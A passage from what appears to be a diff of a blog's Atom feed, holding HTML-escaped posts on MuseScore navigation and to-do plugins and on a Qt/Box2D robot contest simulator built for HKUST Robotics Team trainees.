+&lt;a class=&quot;&quot; title=&quot;Qt-Quick examples.&quot; href=&quot;https://trebledj.me/img/posts/programming/musescore/assets/plugin-qtquick2-876w.webp&quot;&gt;&lt;img class=&quot;multi&quot; src=&quot;https://trebledj.me/img/posts/programming/musescore/assets/plugin-qtquick2-876w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;width:45.41%;aspect-ratio: auto 876 / 548&quot; alt=&quot;Qt-Quick examples.&quot; title=&quot;Qt-Quick examples.&quot; srcset=&quot;https://trebledj.me/img/posts/programming/musescore/assets/plugin-qtquick2-256w.webp 256w, https://trebledj.me/img/posts/programming/musescore/assets/plugin-qtquick2-512w.webp 512w, https://trebledj.me/img/posts/programming/musescore/assets/plugin-qtquick2-876w.webp 876w&quot; sizes=&quot;(max-width: 256px) 256px, (max-width: 512px) 512px, 876px&quot; /&gt;&lt;/a&gt;
+&lt;/div&gt;
+&lt;p class=&quot;caption&quot;&gt;&lt;sup&gt;Qt Quick Controls 1.0 vs 2.0. The latter comes with barely any default and takes more effort to properly set up.&lt;/sup&gt;&lt;/p&gt;
+&lt;p&gt;Implementation-wise, the todo-list plugin aims to be self-contained and simple. Self-contained, meaning that everything is in a single .qml file, so that the user doesn’t need to bother with structure too much. Simple, meaning that it doesn’t store too much metadata. The plugin only stores the configuration options mentioned above. I avoid storing data such as measure and staff—which are alike the x and y position in a score—because things get messy when the stored to-do is displaced, e.g. when a user inserts a bunch of measures or removes an instrument.&lt;/p&gt;
+&lt;p&gt;Even though I’ve used Qt before, I was still surprised with how easy it was to set up a form dialog to configure user settings. Just slap together a &lt;code&gt;Dialog&lt;/code&gt;, &lt;code&gt;GridLayout&lt;/code&gt;, several &lt;code&gt;Label&lt;/code&gt;s and &lt;code&gt;TextField&lt;/code&gt;s, code the logic, and violà—we have our settings dialog.&lt;/p&gt;
+&lt;h2 id=&quot;history&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/musescore-navigation-plugins/#history&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; History&lt;/h2&gt;
+&lt;p&gt;View the project on: &lt;a href=&quot;https://musescore.org/en/project/musescore-navigation&quot;&gt;MuseScore&lt;/a&gt; / &lt;a href=&quot;https://github.com/TrebledJ/musescore-navigation&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;This plugin keeps track of where your cursor has been so that you can easily jump back and forth between different points in time (effectively making you a time traveller!).&lt;/p&gt;
+&lt;p&gt;When programming in an IDE, it is sometimes necessary to jump to a different part of code, then jump back to where you were before. For example, you might want to check the implementation of a certain function.&lt;/p&gt;
+&lt;p&gt;Similarly, when editing a score one might wish to visit a section, perhaps copy something, then return to their previous position.&lt;/p&gt;
+&lt;p&gt;The History module comprises three separate plugins:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Go Back,&lt;/li&gt;
+&lt;li&gt;Go Forward, and&lt;/li&gt;
+&lt;li&gt;the UI.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The first two are action plugins—plugins without any visual component, and just run—whereas the third contains a simple UI. The need for a UI makes the module slightly inflexible for reasons explained below.&lt;/p&gt;
+&lt;h3 id=&quot;developer-s-note-1&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/musescore-navigation-plugins/#developer-s-note-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Developer’s Note&lt;/h3&gt;
+&lt;p&gt;There are some limitations to this module, the root cause being the limited MuseScore plugin API.&lt;/p&gt;
+&lt;p&gt;For the plugins to work properly, the UI plugin must be activated at all times. This plugin is responsible for recording cursor positions, since MuseScore does not provide a way for plugins to record score/cursor information in the background. We &lt;em&gt;could&lt;/em&gt; start a subprocess, keylog user input, and interpret it to determine where the cursor currently is… but this is of course out of the question, it’s much too tedious and not worth the effort.&lt;/p&gt;
+&lt;p&gt;Another drawback is that plugins can’t jump across scores. This is very convenient in IDEs when you have several files open and want to quickly check/copy something from a different file. In MuseScore however, this simply isn’t possible (as far as I could see). So for now, we’ll have to be content with keeping cursor history isolated within each score.&lt;/p&gt;
+&lt;h2 id=&quot;bookmarks&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/musescore-navigation-plugins/#bookmarks&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Bookmarks&lt;/h2&gt;
+&lt;p&gt;View the project on: &lt;a href=&quot;https://musescore.org/en/project/musescore-navigation&quot;&gt;MuseScore&lt;/a&gt; / &lt;a href=&quot;https://github.com/TrebledJ/musescore-navigation&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Marks down a section, saving it so that you can easily return to it later without the pain of scrolling.&lt;/p&gt;
+&lt;p&gt;This is really useful for large scores, where scrolling from front to middle to end can be pain. An existing built-in way to jump around sections is to use rehearsal marks plus MuseScore&#39;s timeline. However, I find this insufficient since a rehearsal mark only carries horizontal positioning info (measures), but not vertical positioning info (staffs).&lt;/p&gt;
+&lt;p&gt;The Bookmarks module comprises four plugins:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Go to Previous Bookmark,&lt;/li&gt;
+&lt;li&gt;Go to Next Bookmark,&lt;/li&gt;
+&lt;li&gt;Toggle Bookmark at Cursor, and&lt;/li&gt;
+&lt;li&gt;Clear All Bookmarks.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;All of these are action plugins, so in my mind they’re fairly simple and straightforward.&lt;/p&gt;
+&lt;h3 id=&quot;developer-s-note-2&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/musescore-navigation-plugins/#developer-s-note-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Developer’s Note&lt;/h3&gt;
+&lt;p&gt;This module was inspired by the VSCode bookmarks plugin. In VSCode, bookmarks allowed you to jump between bookmarks across files and long stretches of code. Sadly alike History, Bookmarks doesn’t jump across files.&lt;/p&gt;
+&lt;p&gt;Something else to note—and this applies to all my plugins here: currently, I use a rather hacky method to jump to the selected notes:&lt;/p&gt;
+&lt;div class=&quot;code-toolbar&quot;&gt;&lt;pre class=&quot;language-js&quot; tabindex=&quot;0&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token function&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;note-input&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;token function&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;note-input&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&quot;toolbar&quot;&gt;&lt;div class=&quot;toolbar-item&quot;&gt;&lt;span class=&quot;lang&quot;&gt;JavaScript&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;toolbar-item&quot;&gt;&lt;button class=&quot;copy-to-clipboard-button&quot; type=&quot;button&quot; title=&quot;Copy Code&quot;&gt;&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;We call the command twice to toggle between the two different modes (default and note-input).&lt;/p&gt;
+&lt;p&gt;However, when jumping to a specific measure + staff, MuseScore will scroll to the correct measure, but not the staff. Logic-wise, nothing is affected since the correct measure + staff are selected. The problem is just a UI issue which the MuseScore Plugins API doesn’t have a solution for. 😢&lt;/p&gt;
+&lt;p&gt;For History and Bookmark, I decided to use separate JS files to hold all the logic. This promotes code reuse. For example, both &lt;em&gt;History: Go Back&lt;/em&gt; and &lt;em&gt;History: Go Forward&lt;/em&gt; use the same underlying function to iterate across the score.&lt;/p&gt;
+&lt;p&gt;I tried commenting my code cleanly, in case I need to come back to it later; I’m quite forgetful.&lt;/p&gt;
+&lt;p&gt;JavaScript’s lack of type checking really irks me. I’m toying with the idea of using TypeScript and compiling the file to JavaScript for testing. I’ve already set up a MakeFile for packaging (zipping) the files anyway, so might as well add a rule that compiles .ts into .js and gain type safety.&lt;/p&gt;
+&lt;h2 id=&quot;epilogue&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/musescore-navigation-plugins/#epilogue&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Epilogue&lt;/h2&gt;
+&lt;p&gt;If you’ve read this far, then you’re probably aware that these plugins aren’t perfect. But most of these issues can&#39;t be trivially fixed due to limitations with the Plugin API.&lt;/p&gt;
+&lt;p&gt;In my development roadmap, I’ve planned several new (music-related!) plugins. As MuseScore 4 is coming out, I’ll also need to plan the maintenance of the above plugins.&lt;/p&gt;
+&lt;p&gt;If you’re interested in using the plugins or contributing, you can check the MuseScore or GitHub links below.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;To-Do List&lt;/strong&gt;: &lt;a href=&quot;https://musescore.org/en/project/musescore-do-list&quot;&gt;MuseScore&lt;/a&gt; / &lt;a href=&quot;https://github.com/TrebledJ/musescore-todo-list&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;History + Bookmarks&lt;/strong&gt;: &lt;a href=&quot;https://musescore.org/en/project/musescore-navigation&quot;&gt;MuseScore&lt;/a&gt; / &lt;a href=&quot;https://github.com/TrebledJ/musescore-navigation&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Thanks for reading, and happy musing!&lt;/p&gt;
+</content>
+        
+          <category>programming</category>
+        
+          <category>project</category>
+        
+          <category>qml</category>
+        
+          <category>js</category>
+        
+          <category>apps</category>
+        
+          <category>qt</category>
+        
+          <category>music</category>
+        
+      </entry>
+    
+  
+    
+      
+      <entry>
+        <title>Robot Design Contest Simulator</title>
+        <description>Here you can drive robots without having to worry about damaging physical property or being impaled.</description>
+        <link href="https://trebledj.me/posts/robot-design-contest-simulator/"/>
+        <updated>2020-12-10T00:00:00Z</updated>
+        <id>https://trebledj.me/posts/robot-design-contest-simulator/</id>
+        <content xml:lang="en" type="html">&lt;p&gt;This project was part of a recruitment phase for the HKUST Robotics Team. We used Qt for the GUI and Box2D for physics. The public-facing side of the project is uploaded &lt;a href=&quot;https://github.com/HKUST-Robocon/RDC-Emulator-2020&quot;&gt;online&lt;/a&gt;, and the desktop applications are &lt;a href=&quot;https://github.com/HKUST-Robocon/RDC-Emulator-2020/releases&quot;&gt;available for download&lt;/a&gt;, but the source code is kept hidden. This post will provide some context and thought processes behind the design.&lt;/p&gt;
+&lt;h3 id=&quot;context&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/robot-design-contest-simulator/#context&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Context&lt;/h3&gt;
+&lt;p&gt;Every year, the &lt;a href=&quot;https://robotics.hkust.edu.hk/&quot;&gt;HKUST Robotics Team&lt;/a&gt; will host a set of training sessions followed by an internal competition (aka a Robot Design Contest or RDC) for trainees to test their mettle and skills. Trainees are segregated into mechanical, hardware, and software divisions, each division training a different skill set. In the RDC, trainees are grouped such that there is a fair distribution of trainees from each division.&lt;/p&gt;
+&lt;p&gt;Our RDCs generally work as follows:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Seniors construct game rules and game field (combining elements of ABU Robocon, MATE ROV, and NXP Cup Smart Car competitions). Usually the game is in a 1v1 (team vs team) format, which makes for a competitive and riveting atmosphere.&lt;/li&gt;
+&lt;li&gt;Trainees read and understand game rules.&lt;/li&gt;
+&lt;li&gt;Trainee teams construct, wire, and develop their robots to play the game described by the game rules.&lt;/li&gt;
+&lt;li&gt;On game day, teams bring in their robots to the constructed game field and compete.&lt;/li&gt;
+&lt;li&gt;Afterwards, trainees are evaluated by peers and seniors.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;This year, the RDC game involved a robot tasked with picking up tennis balls and ping-pong balls from a basket. The robot needs to navigate a complex field with various obstacles.&lt;/p&gt;
+&lt;p&gt;Under normal circumstances, the training and RDC are held in a face-to-face mode, so that trainees are actively engaged and participating. But due to the Covid-19 pandemic and restrictions set in Hong Kong, we had to move the aforementioned events online.&lt;/p&gt;
+&lt;p&gt;With the RDC online, mech, hardware, and software divisions became more segregated. As trainees could not access our robotics lab, materials, and tools, the mech and hardware divisions had to settle with drawing SolidWorks/PCBs which are then reviewed and assessed by seniors. In the software division, we tested candidates&#39; technical and collaborative skills with the RDC Simulator.&lt;/p&gt;
+&lt;p&gt;In the rest of this post, I&#39;ll use the terms &amp;quot;trainee&amp;quot; and &amp;quot;user&amp;quot; interchangeably. I&#39;ll also use the term &amp;quot;User Program&amp;quot; to refer to the program that software trainees are tasked to write.&lt;/p&gt;
+&lt;h3 id=&quot;high-level-overview&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/robot-design-contest-simulator/#high-level-overview&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; High-Level Overview&lt;/h3&gt;
+&lt;p&gt;To give an idea of what the simulator looks like, here&#39;s a little annotated screenshot of an early version:&lt;/p&gt;
+&lt;p&gt;&lt;a class=&quot;lightbox-single&quot; title=&quot;Annotation of the simulation UI&quot; href=&quot;https://trebledj.me/img/posts/projects/03-rdc-simulator/assets/setup-1600w.webp&quot;&gt;&lt;img class=&quot;mb-2 rw center jw-85&quot; src=&quot;https://trebledj.me/img/posts/projects/03-rdc-simulator/assets/setup-1600w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;aspect-ratio: auto 1600 / 1242&quot; alt=&quot;Annotation of the simulation UI&quot; title=&quot;Annotation of the simulation UI&quot; srcset=&quot;https://trebledj.me/img/posts/projects/03-rdc-simulator/assets/setup-256w.webp 256w, https://trebledj.me/img/posts/projects/03-rdc-simulator/assets/setup-512w.webp 512w, https://trebledj.me/img/posts/projects/03-rdc-simulator/assets/setup-1024w.webp 1024w, https://trebledj.me/img/posts/projects/03-rdc-simulator/assets/setup-1600w.webp 1600w&quot; sizes=&quot;(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1600px&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Its core features?&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;A &lt;strong&gt;simulation area&lt;/strong&gt;. This is where the robot is displayed and simulated. The position of the robot and its enabled sensors/motors are drawn, along with the bounding boxes of the obstacles. (Yes, collision detection exists.)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Components display&lt;/strong&gt;. This lists the values of various sensors, useful for debugging. Most sensors have numeric values. The camera is a bit special, and attempts to render a 3D image (by perspective transform).&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Configuration&lt;/strong&gt;: We want trainees to be able to configure compile options (although the choice of compiler itself is fixed, GCC for Windows/Linux, clang for macOS). Trainees can also select the folder where their program code is stored.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Playback controls&lt;/strong&gt;. Trainees have some control over the playback: reset, start, and stop. (No pausing though.)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Logging&lt;/strong&gt;. This is where logging is displayed, log messages from both the simulator and user program will be fed here.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;With this GUI in mind, the basic user flow for trainees is:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Write code in an IDE of their choice.&lt;/li&gt;
+&lt;li&gt;Open the simulator program.&lt;/li&gt;
+&lt;li&gt;Select the folder where their code is stored.&lt;/li&gt;
+&lt;li&gt;Click the &amp;quot;Run&amp;quot; button.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;After pressing &amp;quot;Run&amp;quot;, the simulator does the rest of the magic. It compiles the user&#39;s code, runs it in a subprocess, and connects with it via standard I/O. The simulation takes into account user commands and physics, simulating at roughly 40 FPS (rather slow, but it&#39;ll have to do &amp;gt;_&amp;lt;).&lt;/p&gt;
+&lt;p&gt;In a later version, there is a &amp;quot;Demo&amp;quot; mode which allows trainees to see how many points they&#39;ve accumulated according to the game rules.&lt;/p&gt;
+&lt;h3 id=&quot;planning&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/robot-design-contest-simulator/#planning&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Planning&lt;/h3&gt;
+&lt;p&gt;This year&#39;s RDC was held from November to December 2020. We only started developing the simulator in August. Since we lacked time and had to make room for studying, we had to flesh out and plan the simulator early on. We came to the following conclusions:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;The available sensors and motors are limited (max 1 camera, 4 magnetic sensors, 5 line sensors, 4 IR sensors, 2 motors for wheels, 1 grabbing mechanism, 1 throwing mechanism).&lt;/li&gt;
+&lt;li&gt;The simulated chassis (robot body) is the same for all software teams. Each body has a rectangular shape and a cow-eye wheel near the back.&lt;/li&gt;
+&lt;li&gt;The advanced mechanisms (grabbing/throwing) are the same for all software teams.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;In robotics, a program is usually compiled then transferred over to a microcontroller. The program typically has direct access to control all the necessary peripherals and actuators (e.g. GPIO pins to read button input and toggle LEDs, functions to tell a motor how fast to spin). But this year the trainees do not have this grand luxury.&lt;/p&gt;
+&lt;p&gt;Instead of writing a program that can touch the peripherals and actuators, trainees write a program which communicates with the simulator via standard I/O. In a microcontroller, GPIO pins can be accessed and read directly; but in the RDC simulator, GPIO data is provided from standard input. If an object is detected, the GPIO pin outputs a 1. Otherwise, it outputs a 0.&lt;/p&gt;
+&lt;div class=&quot;alert alert-info d-flex align-items-start&quot;&gt; &lt;i class=&quot;fas fa-bolt ms-1 me-3 mt-1 fs-4&quot; role=&quot;img&quot;&gt;&lt;/i&gt; &lt;div class=&quot;alert-content flex-fill mt-0&quot;&gt;
+&lt;p&gt;&lt;strong&gt;What is GPIO?&lt;/strong&gt;
+General purpose input/output. In layman&#39;s terms: communicating with 1s and 0s. An example of a sensor which uses GPIO is an infrared (IR) sensor, which detects if an object is present within a certain distance in a fixed direction.&lt;/p&gt;
+&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;I won&#39;t describe the communication model between the simulator and user program in detail, since it&#39;s a bit convoluted and messy. (Although you can still &lt;a href=&quot;https://hackmd.io/@TrebledJ/S1Zh67hOv#General-Flow&quot;&gt;check it out&lt;/a&gt;.) But suffice to say, there are advantages and disadvantages. An advantage is that the simulator and user program are decoupled, so the simulation would look nice and appear smooth. A disadvantage of our implementation is that the two programs (simulator and user) run asynchronously; and due to timing issues, this means that the simulation runs differently each time we hit &amp;quot;Run&amp;quot; (even without setting any randomness to our input).&lt;/p&gt;
+&lt;p&gt;This disadvantage seems to heavily outweigh the advantage; but in our defence, it simulates the real world of robotics perfectly. Even though the microcontroller processors are designed to be deterministic, sensor input and motor control are almost always non-deterministic (i.e. random) to a certain degree. :P&lt;/p&gt;
+&lt;div class=&quot;alert alert-info d-flex align-items-start&quot;&gt; &lt;i class=&quot;fas fa-bolt ms-1 me-3 mt-1 fs-4&quot; role=&quot;img&quot;&gt;&lt;/i&gt; &lt;div class=&quot;alert-content flex-fill mt-0&quot;&gt;
+&lt;p&gt;The communication model was inspired by Codingame&#39;s turn-based games. However, Codingame&#39;s turn based system provides all available input every single turn. In the RDC emulator, we only provide input if the user program requests it. Why? Well... in retrospect, we &lt;em&gt;could&lt;/em&gt; have sent all available input... but by the time we realised this, it was a bit too late to change, otherwise we would break a lot of the code trainees have already written. Codingame&#39;s turn-based model is certainly much cleaner though.&lt;/p&gt;
+&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;developing-the-simulator&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/robot-design-contest-simulator/#developing-the-simulator&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Developing the Simulator&lt;/h3&gt;
+&lt;h4 id=&quot;project-management&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/robot-design-contest-simulator/#project-management&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Project Management&lt;/h4&gt;
+&lt;p&gt;We used our good friend GitHub projects and GitHub issues for project management and issue tracking.&lt;/p&gt;
+&lt;p&gt;&lt;a class=&quot;lightbox-single&quot; title=&quot;List of GitHub issues (most of them resolved).&quot; href=&quot;https://trebledj.me/img/posts/projects/03-rdc-simulator/assets/issues-2438w.webp&quot;&gt;&lt;img class=&quot;mb-2 rw center jw-100 &quot; src=&quot;https://trebledj.me/img/posts/projects/03-rdc-simulator/assets/issues-2438w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;aspect-ratio: auto 2438 / 1454&quot; alt=&quot;List of GitHub issues (most of them resolved).&quot; title=&quot;List of GitHub issues (most of them resolved).&quot; srcset=&quot;https://trebledj.me/img/posts/projects/03-rdc-simulator/assets/issues-256w.webp 256w, https://trebledj.me/img/posts/projects/03-rdc-simulator/assets/issues-512w.webp 512w, https://trebledj.me/img/posts/projects/03-rdc-simulator/assets/issues-1024w.webp 1024w, https://trebledj.me/img/posts/projects/03-rdc-simulator/assets/issues-2438w.webp 2438w&quot; sizes=&quot;(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 2438px&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Some general thoughts looking back:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;The kanban boards that GitHub projects provides turned out to be quite effective in organising to-dos. It allowed all our project members to see the active and completed to-dos.
+&lt;ul&gt;
+&lt;li&gt;One addition I made was adding a &amp;quot;Priority To-Do&amp;quot; column to help better prioritise our to-dos.&lt;/li&gt;
+&lt;li&gt;Automation was pretty handy. When I closed an issue or linked+merged a pull request, the relevant card in the GitHub project would be automatically moved from to &amp;quot;Done&amp;quot;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;The milestones feature wasn&#39;t too bad as it helped group to-dos under similar milestones. But in the end, we didn&#39;t really check up on it and ran over some deadlines. Perhaps it is more effective if paired with regular progress updates and meetings, but we had neither of those here.&lt;/li&gt;
+&lt;li&gt;Unrelated to GitHub, but I decided to set up a &lt;code&gt;.clang-format&lt;/code&gt; file and standardise formatting, because it&#39;s &lt;em&gt;that&lt;/em&gt; important. :P
+&lt;ul&gt;
+&lt;li&gt;Qt has a nice ClangFormat plugin. One of my other teammates managed to set up Qt on VSCode, so he has direct access to all the other nice VSCode stuff.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&quot;coding&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/robot-design-contest-simulator/#coding&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Coding&lt;/h4&gt;
+&lt;p&gt;We used Qt as our GUI framework since most of us were familiar with it. We would have gone with C++20 had QtCreator fully supported it, so we had to be content with C++17. Some points of interest:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;QGraphicsView&lt;/code&gt; and &lt;code&gt;QGraphicsItem&lt;/code&gt; are pretty nice. Just pay attention to your axes and frame of reference.&lt;/li&gt;
+&lt;li&gt;We used &lt;code&gt;QPlainTextEdit&lt;/code&gt; for the logging widget. It&#39;s pretty good.
+&lt;ul&gt;
+&lt;li&gt;We extended it with a custom slot for pushing log messages and highlighting them depending on a log level.&lt;/li&gt;
+&lt;li&gt;e.g. &amp;quot;Warning&amp;quot; messages are orange, &amp;quot;Error&amp;quot; messages are red, and &amp;quot;Success&amp;quot; messages are green.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;QProcess&lt;/code&gt; is also pretty nice and feature-rich. I ended up inheriting from it and tacking on some custom signals and slots.&lt;/li&gt;
+&lt;li&gt;Qt&#39;s UI designer is a blessing.
+&lt;ul&gt;
+&lt;li&gt;Since we derived new classes for &lt;code&gt;QGraphicsView&lt;/code&gt; (for drawing the simulation) and &lt;code&gt;QPlainTextEdit&lt;/code&gt; (for the logger), we had to &lt;em&gt;promote&lt;/em&gt; widgets in the UI designer. The process was rather straightforward, I think.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;C++ parameter packs are pretty fun to write, as they have all the flexibility of varargs combined with type safety.&lt;/li&gt;
+&lt;li&gt;For those curious how we simulated the camera, we used perspective transform to render a 2D image in a 3D style. The only limitation was that there was no height information, so a tall pole would still appear flat at ground level. Nevertheless, it was good enough to generate input for the camera sensor. Its main use case is for detecting the black lines along the white/black track.
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;QTransform::quadToQuad&lt;/code&gt; and &lt;code&gt;QImage::transformed&lt;/code&gt; were really helpful here.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&quot;physics&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/robot-design-contest-simulator/#physics&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Physics&lt;/h4&gt;
+&lt;p&gt;For physics, we ended up choosing Box2D. We decided to go with this library since it seemed like a simple, mature 2D physics library. We didn&#39;t go with 3D engines as they seemed overly complicated and probably require more computational power, not to mention testing and debugging.&lt;/p&gt;
+&lt;p&gt;One pain point I encountered was that the &lt;code&gt;b2vec2&lt;/code&gt; constructor does not have default values! This caused me grief, since objects were beginning to fly &lt;em&gt;&lt;strong&gt;everywhere&lt;/strong&gt;&lt;/em&gt;. And it took a LONG TIME TO DEBUGGGGG!!! I had assumed that since it was a C++-based library, it would have reasonable defaults. Well apparently not.&lt;/p&gt;
+&lt;p&gt;&lt;a class=&quot;lightbox-single&quot; title=&quot;box2d y u no embrace c++&quot; href=&quot;https://trebledj.me/img/posts/projects/03-rdc-simulator/assets/b2vec2-700w.webp&quot;&gt;&lt;img class=&quot;mb-2 rw center jw-65&quot; src=&quot;https://trebledj.me/img/posts/projects/03-rdc-simulator/assets/b2vec2-700w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;aspect-ratio: auto 700 / 449&quot; alt=&quot;Gru meme: Even Gru&#39;s engineering ingenuity couldn&#39;t stop b2vec2.&quot; title=&quot;box2d y u no embrace c++&quot; srcset=&quot;https://trebledj.me/img/posts/projects/03-rdc-simulator/assets/b2vec2-256w.webp 256w, https://trebledj.me/img/posts/projects/03-rdc-simulator/assets/b2vec2-512w.webp 512w, https://trebledj.me/img/posts/projects/03-rdc-simulator/assets/b2vec2-700w.webp 700w&quot; sizes=&quot;(max-width: 256px) 256px, (max-width: 512px) 512px, 700px&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h4 id=&quot;documentation&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/robot-design-contest-simulator/#documentation&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Documentation&lt;/h4&gt;
+&lt;p&gt;There are various sources for documentation on the RDC simulator. We have &lt;a href=&quot;https://github.com/HKUST-Robocon/RDC-Emulator-2020/blob/master/README.md&quot;&gt;documentation related to setup, installation, and administrative procedures&lt;/a&gt; and another set of &lt;a href=&quot;https://hackmd.io/@TrebledJ/S1Zh67hOv&quot;&gt;documentation for coding a user program&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Being a rather detail-oriented person, I have become quite fond of checking and double-checking documentation. This may seem overly unnecessary, but it helps to have a link to point to when someone asks a question.&lt;/p&gt;
+&lt;h3 id=&quot;conclusion&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/robot-design-contest-simulator/#conclusion&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Conclusion&lt;/h3&gt;
+&lt;p&gt;At least two software trainee teams managed to complete the game and score full points.&lt;/p&gt;
+&lt;p&gt;&lt;a class=&quot;lightbox-single&quot; title=&quot;The winning team! They managed to complete all tasks. Please forgive the font in the UI. I forgot to package the font in the Qt binary, so it looks jank on Windows.&quot; href=&quot;https://trebledj.me/img/posts/projects/03-rdc-simulator/assets/winner-2828w.webp&quot;&gt;&lt;img class=&quot;mb-2 rw center jw-100 &quot; src=&quot;https://trebledj.me/img/posts/projects/03-rdc-simulator/assets/winner-2828w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;aspect-ratio: auto 2828 / 1538&quot; alt=&quot;The winning team! They managed to complete all tasks. Please forgive the font in the UI. I forgot to package the font in the Qt binary, so it looks jank on Windows.&quot; title=&quot;The winning team! They managed to complete all tasks. Please forgive the font in the UI. I forgot to package the font in the Qt binary, so it looks jank on Windows.&quot; srcset=&quot;https://trebledj.me/img/posts/projects/03-rdc-simulator/assets/winner-256w.webp 256w, https://trebledj.me/img/posts/projects/03-rdc-simulator/assets/winner-512w.webp 512w, https://trebledj.me/img/posts/projects/03-rdc-simulator/assets/winner-1024w.webp 1024w, 